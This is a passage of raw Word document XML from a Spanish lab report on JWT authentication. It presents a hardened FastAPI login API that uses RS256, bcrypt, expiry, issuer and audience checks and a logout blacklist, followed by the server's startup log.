        <w:t xml:space="preserve">  • Un atacante que roba la clave pública NO puede falsificar tokens</w:t>
      </w:r>
      <w:r w:rsidR="00000000" w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F8AF1C7" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="240" w:after="80"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="36"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>4. API Segura</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="506A4438" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>La versión segura corrige todas las vulnerabilidades identificadas aplicando mejores prácticas de OWASP: RS256 con par de claves asimétricas, hash bcrypt para contraseñas, validación estricta del token (firma, expiración, issuer, audience) y lista negra de tokens para soporte de logout.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38ECCA60" w14:textId="77777777" w:rsidR="00233214" w:rsidRPr="00233214" w:rsidRDefault="00233214" w:rsidP="00233214">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3E462411" w14:textId="6F1C8516" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00233214" w:rsidP="00233214">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00233214">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="20"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>MEJORAS DE SEGURIDAD IMPLEMENTADAS:</w:t>
      </w:r>
      <w:r w:rsidRPr="00233214">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="20"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">  [1] RS256 con par de claves RSA-2048 (asimétrico) → imposible forjar tokens</w:t>
      </w:r>
      <w:r w:rsidRPr="00233214">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="20"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">  [2] bcrypt para hashing de contraseñas → resistente a ataques de diccionario</w:t>
      </w:r>
      <w:r w:rsidRPr="00233214">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="20"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">  [3] Validación de firma obligatoria en verify_token()</w:t>
      </w:r>
      <w:r w:rsidRPr="00233214">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="20"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">  [4] Campo 'exp' → tokens con expiración de 15 minutos</w:t>
      </w:r>
      <w:r w:rsidRPr="00233214">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="20"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">  [5] Claims 'iss' y 'aud' → verifica que el token es para ESTA aplicación</w:t>
      </w:r>
      <w:r w:rsidRPr="00233214">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="20"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">  [6] BLACKLIST en memoria → soporte de logout y revocación de tokens</w:t>
      </w:r>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="20"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">  [7] Manejo de JWTError → errores controlados, sin información filtrada</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23E27FB6" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="240" w:after="80"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Archivo: secure_auth.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="434A334C" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="120" w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  secure_auth.py</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="Tablaconcuadrcula"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="9360"/>
      </w:tblGrid>
      <w:tr w:rsidR="00FF500C" w:rsidRPr="00AB6745" w14:paraId="5E9160C7" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9360" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1E1E1E"/>
          </w:tcPr>
          <w:p w14:paraId="109EBDB5" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00FF500C">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="34E08D17"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secure_auth.py</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="25917802"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from fastapi import FastAPI, HTTPException, Header</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="58B5B799"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from pydantic import BaseModel</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4E513E60"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import bcrypt</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1DD2C1E4"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from jose import jwt, JWTError</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="39651993"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from datetime import datetime, timedelta</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7692FCC2"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from typing import Optional</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7FF78EF1"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w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5733A61D"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app = FastAPI()</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="73789C65"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w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7514C42D"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def hash_password(password: str) -&gt; str:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="38B6EB5C"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return bcrypt.hashpw(password.encode(), bcrypt.gensalt()).decode()</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5C6FE962"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w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4C5940F3"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def verify_password(plain: str, hashed: str) -&gt; bool:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="171D76C8"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return bcrypt.checkpw(plain.encode(), hashed.encode())</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="60629B97"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w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="41F7CDE4"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USERS = {</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5AA27C18"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"alice@example.com": {"password": hash_password("password123"), "role": "user"},</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="267F7D83"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"admin@example.com": {"password": hash_password("adminpass"), "role": "admin"},</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="03FEC770"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w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6035B3AE"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w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="073B098F"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with open("private.pem", "rb") as f:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7EEA6346"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PRIVATE_KEY = f.read()</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="00EF7AB5"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with open("public.pem", "rb") as f:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7E43120B"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PUBLIC_KEY = f.read()</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6E183B36"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w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="32A47EBA"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ISS = "mi-curso-ucc"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6B9E8600"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AUD = "ucc-client"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3B87A570"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ACCESS_TOKEN_EXPIRE_MINUTES = 15</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5DE281D8"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BLACKLIST = set()</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="559C123C"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w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5F746EAC"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class LoginIn(BaseModel):</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="10C6A563"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email: str</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2FC385D5"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password: str</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7AF1FF10"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w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="30D2FBFB"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def create_access_token(data: dict):</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="291986B4"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lastRenderedPageBreak/>
              <w:t xml:space="preserve">    now = datetime.utcnow()</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="53517BE9"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expire = now + timedelta(minutes=ACCESS_TOKEN_EXPIRE_MINUTES)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="780B6F49"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to_encode = {</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="69B934F5"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**data,</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="01319B83"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"exp": expire,</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="67279168"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"iat": now,</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7402320C"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"iss": ISS,</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1346F7EA"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"aud": AUD</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="24A181BC"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w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="62FAC5D6"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return jwt.encode(to_encode, PRIVATE_KEY, algorithm="RS256")</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="498499F4"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w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7F12FF1A"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@app.post("/login")</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="16D18401"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def login(data: LoginIn):</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7EC1E211"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user = USERS.get(data.email)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6F0A9FDB"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if not user or not verify_password(data.password, user["password"]):</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="05A3942A"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raise HTTPException(status_code=401, detail="Credenciales invÃ¡lidas")</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6F77CF9E"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w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6264E1B9"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payload = {"sub": data.email, "role": user["role"]}</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="533463D4"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token = create_access_token(payload)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1BE68BE4"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return {"access_token": token}</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7691756E"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w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4552E15D"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def verify_token(token: str):</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="179C95EA"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try:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6D2FDF69"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payload = jwt.decode(token, PUBLIC_KEY, algorithms=["RS256"], audience=AUD, issuer=ISS)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="609AC231"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except JWTError:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2C18C62A"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raise HTTPException(status_code=401, detail="Token invÃ¡lido")</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4D771678"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w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6CA5D1EF"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if token in BLACKLIST:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="30739D95"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raise HTTPException(status_code=401, detail="Token revocado")</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5E713C5C"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w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="39259074"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return payload</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="712395B8"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w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7D339D0A"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@app.get("/admin")</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="401C89BC"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def admin(authorization: Optional[str] = Header(None)):</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="21DCC9F0"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if not authorization:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2E3BD175"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raise HTTPException(401, "Missing token")</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="47DF441B"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token = authorization.split(" ")[1]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5B44880A"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payload = verify_token(token)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6F23C55E"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w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4A5789E7"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if payload["role"] != "admin":</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1B524C58"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raise HTTPException(403, "Forbidden")</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3F479540"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w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="38358474" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="D4D4D4"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    </w:t>
            </w:r>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="D4D4D4"/>
                <w:sz w:val="17"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
              <w:t>return {"msg": "Acceso seguro - solo administradores"}</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="78272590" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="D4D4D4"/>
                <w:sz w:val="17"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="10D8F3D6"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@app.post("/logout")</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6E0F0938"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def logout(authorization: Optional[str] = Header(None)):</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="51E19730"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if not authorization:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5671F15D"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raise HTTPException(401, "Missing token")</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6C457052"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token = authorization.split(" ")[1]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3EF2FD70"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BLACKLIST.add(token)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0AF19113"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return {"msg": "logout exitoso"}</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="70574224" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="D4D4D4"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0A3A9C52" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00FF500C">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="058BAA18" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="240" w:after="80"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Inicio del servidor seguro (puerto 8001)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A0905F3" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="18"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>&gt; CMD – Inicio servidor seguro</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="Tablaconcuadrcula"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="9360"/>
      </w:tblGrid>
      <w:tr w:rsidR="00FF500C" w:rsidRPr="00AB6745" w14:paraId="372E241C" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9360" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="0C0C0C"/>
          </w:tcPr>
          <w:p w14:paraId="27363410" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00FF500C">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="65781C28" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>C:\...\lab_auth_security&gt; uvicorn secure_auth:app --reload --port 8001</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4BDD1C46" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7C9278ED" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>INFO:     Uvicorn running on http://127.0.0.1:8001 (Press CTRL+C to quit)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1A361196" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>INFO:     Started reloader process [22345] using WatchFiles</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="274D7A24" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>INFO:     Started server process [22346]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="625377F7" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>INFO:     Application startup complete.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="002C16CD" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00FF500C">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="367354AB" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="018405AF" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="240" w:after="80"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="36"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>5. Pruebas de la API Segura</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40DAB91B" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="240" w:after="80"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="24"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Prueba 1 – Login con credenciales válidas</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21FC12EF" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
